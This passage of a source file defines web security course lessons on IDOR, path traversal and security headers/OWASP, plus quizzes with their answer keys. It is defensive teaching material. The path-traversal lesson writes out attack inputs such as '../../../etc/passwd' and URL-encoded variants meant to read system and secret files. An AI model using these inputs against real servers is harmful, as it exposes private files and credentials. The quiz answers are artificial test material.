      mcQuiz(
        "ws-idor-q1",
        "IDOR is best described as:",
        ["Injecting SQL in search", "Accessing objects by ID without proper authorization", "Stealing DNS", "Weak TLS"],
        1,
        "The flaw is missing verification that the user may access the requested object.",
      ),
      tfQuiz(
        "ws-idor-q2",
        "Using random UUIDs in URLs eliminates the need for authorization checks.",
        false,
        "UUIDs reduce guessing but leaked or enumerated IDs still need ownership checks.",
      ),
      mcQuiz(
        "ws-idor-q3",
        "A proper fix for receipt IDOR includes:",
        ["Hiding the URL", "Querying with both receipt ID and authenticated owner ID", "Using HTTP instead of HTTPS", "Longer passwords only"],
        1,
        "Queries must scope data to the authorized user or role.",
      ),
    ],
    practiceLink: lab("whos-that-user", "Who's That User? Lab"),
  }),

  createLesson({
    id: "web-security-path-traversal",
    pathId: PATH,
    order: 11,
    title: "Path Traversal",
    summary:
      "Escaping intended directories with ../ and variants to read or write files outside the allowed path.",
    objectives: [
      "Explain how ../ sequences navigate to parent directories",
      "Recognize URL encoding and normalization tricks",
      "Canonicalize paths and enforce jail to a base directory",
    ],
    introduction:
      "Applications that read files based on user input — download?file=report.pdf, template loaders, image resizers — risk path traversal. If the server concatenates user input onto a base path without normalization, attackers supply ../ to reach sensitive files like /etc/passwd or application config.",
    coreConcepts: [
      "../ walks up one directory; repeated sequences reach arbitrary paths on naive implementations.",
      "URL encoding (%2e%2e%2f) may bypass simple filters.",
      "Windows paths use ..\\ and may accept mixed separators.",
      "Canonicalize to absolute path and verify it starts with allowed base directory.",
      "Store uploads outside web root; serve via controlled handlers, not direct paths.",
    ],
    explanation:
      "Vulnerable: readFile('/var/www/public/' + userInput). Input ../../../etc/passwd resolves outside public. Safe approach: resolve path with path.resolve(base, userInput), verify resolved.startsWith(base), reject if not. Deny absolute paths and null bytes. For zip slips, validate archive entries similarly before extraction.",
    realWorld:
      "Path traversal has leaked source code, SSH keys, and .env files from misconfigured download endpoints. Combined with LFI, it can enable remote code execution when logs or uploads are poisoned.",
    scenario:
      "File viewer serves /public/docs/{name}. Attacker requests name=../../../../secret/admin-notes.txt. What file operation failed?",
    terms: [
      { term: "Directory traversal", definition: "Synonym for path traversal — accessing files outside intended directory." },
      { term: "Canonicalization", definition: "Resolving . and .. to produce a normalized absolute path." },
      { term: "Zip slip", definition: "Traversal via malicious archive entry paths during unzip." },
    ],
    mistakes: [
      "Stripping ../ once while double-encoded variants remain.",
      "Checking prefix on non-canonical paths.",
      "Running file APIs as root or Administrator.",
    ],
    defensive: [
      "Use API identifiers mapping to internal paths, not raw filenames from users.",
      "Canonicalize and jail paths; deny on mismatch.",
      "Least-privilege OS accounts for web processes.",
    ],
    quiz: [
      mcQuiz(
        "ws-path-q1",
        "Path traversal often uses which sequence?",
        ["OR 1=1", "../", "SELECT *", "javascript:"],
        1,
        "../ moves to the parent directory in path strings.",
      ),
      tfQuiz(
        "ws-path-q2",
        "Filtering the string ../ once is always sufficient protection.",
        false,
        "Encoding, doubling, and Unicode variants may bypass naive filters; canonicalize instead.",
      ),
      mcQuiz(
        "ws-path-q3",
        "After resolving a path, the server should verify:",
        ["The file is popular", "The resolved path stays within the allowed base directory", "The user uses Chrome", "DNS is valid"],
        1,
        "Jail checks ensure resolved paths cannot escape the intended root.",
      ),
    ],
    practiceLink: lab("lost-in-files", "Lost in the Files Lab"),
  }),

  createLesson({
    id: "web-security-headers-owasp",
    pathId: PATH,
    order: 12,
    title: "Security Headers and OWASP",
    summary:
      "Browser-enforced HTTP headers and the OWASP Top 10 as a prioritization framework for web risk.",
    objectives: [
      "Name key security headers and their purposes",
      "Map OWASP Top 10 categories to concrete controls",
      "Use checklists and labs to verify defense in depth",
    ],
    introduction:
      "Security headers instruct browsers to enforce policies without changing application code — CSP against XSS, HSTS against downgrade, X-Frame-Options against clickjacking. The OWASP Top 10 lists the most critical web application risks based on industry data. Together they give defenders a vocabulary and a prioritized roadmap.",
    coreConcepts: [
      "Content-Security-Policy (CSP) restricts script, style, and resource origins.",
      "Strict-Transport-Security (HSTS) forces HTTPS for a period.",
      "X-Frame-Options or frame-ancestors in CSP prevents clickjacking.",
      "X-Content-Type-Options: nosniff stops MIME confusion attacks.",
      "OWASP Top 10 includes broken access control, injection, insecure design, and security misconfiguration.",
    ],
    explanation:
      "Headers are set on server or CDN responses. Example: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc'. OWASP categories cross-cut the lessons you studied: A01 broken access control (IDOR), A03 injection (SQLi), A07 identification failures (auth). Use OWASP ASVS for detailed requirements. Scan with security header analyzers and fix gaps per environment.",
    realWorld:
      "Missing CSP allowed XSS to execute freely in many breaches; missing HSTS enabled sslstrip on captive portals. Compliance frameworks reference OWASP for application security testing scope.",
    scenario:
      "Response lacks CSP, HSTS, and X-Frame-Options. An attacker iframes the login page for clickjacking and downgrades a user on public Wi‑Fi. Which headers address each issue?",
    terms: [
      { term: "HSTS", definition: "HTTP Strict Transport Security — tells browsers to use HTTPS only for the site." },
      { term: "Clickjacking", definition: "Tricking users to click hidden UI in a framed page." },
      { term: "OWASP Top 10", definition: "Regularly updated list of the most critical web application security risks." },
    ],
    mistakes: [
      "Deploying CSP report-only forever without enforcing.",
      "Treating OWASP as a checkbox once a year instead of continuous testing.",
      "Setting headers only on HTML, not API responses that return sensitive data.",
    ],
    defensive: [
      "Baseline headers on all responses; tune CSP gradually.",
      "Align SDLC with OWASP ASVS or SAMM maturity.",
      "Combine headers, secure coding, and regular authorized testing.",
    ],
    quiz: [
      mcQuiz(
        "ws-owasp-q1",
        "Which header helps prevent clickjacking?",
        ["X-Frame-Options", "Accept-Encoding", "Cache-Control", "User-Agent"],
        0,
        "X-Frame-Options (or CSP frame-ancestors) controls whether the page may be framed.",
      ),
      mcQuiz(
        "ws-owasp-q2",
        "OWASP Top 10 is intended to:",
        ["List every CVE", "Prioritize the most critical web application risks", "Replace all compliance laws", "Configure firewalls only"],
        1,
        "It helps teams focus on widespread, high-impact vulnerability classes.",
      ),
      tfQuiz(
        "ws-owasp-q3",
        "HSTS reduces the risk of SSL stripping attacks.",
        true,
        "HSTS instructs browsers to refuse plaintext HTTP for the policy duration.",
      ),
    ],
    practiceLink: lab("security-headers", "Security Headers Lab"),
  }),
];

export const webSecurityAssessment = createPathAssessment(
  PATH,
  "Web Security Path Assessment",
  [
    mcQuiz("ws-final-1", "Which flaw lets attackers run JavaScript in victims' browsers?", ["SQL injection", "XSS", "Path traversal", "Weak DNS"], 1, "XSS executes script in the victim browser context."),
    mcQuiz("ws-final-2", "Primary SQLi defense?", ["Base64", "Parameterized queries", "Cookies", "GIF images"], 1, "Parameter binding prevents input from altering SQL structure."),
    mcQuiz("ws-final-3", "IDOR is fixed by:", ["Hiding buttons", "Server-side object authorization", "Using HTTP/2", "Bigger logos"], 1, "Every object access must verify the user may view that resource."),
    tfQuiz("ws-final-4", "CSRF tokens protect state-changing requests from forged cross-site submissions.", true, "Tokens prove the request came from the legitimate app."),
    mcQuiz("ws-final-5", "HttpOnly cookies primarily mitigate:", ["SQL injection", "JavaScript reading session cookies after XSS", "DDoS", "Port scans"], 1, "HttpOnly blocks document.cookie access."),
  ],
);
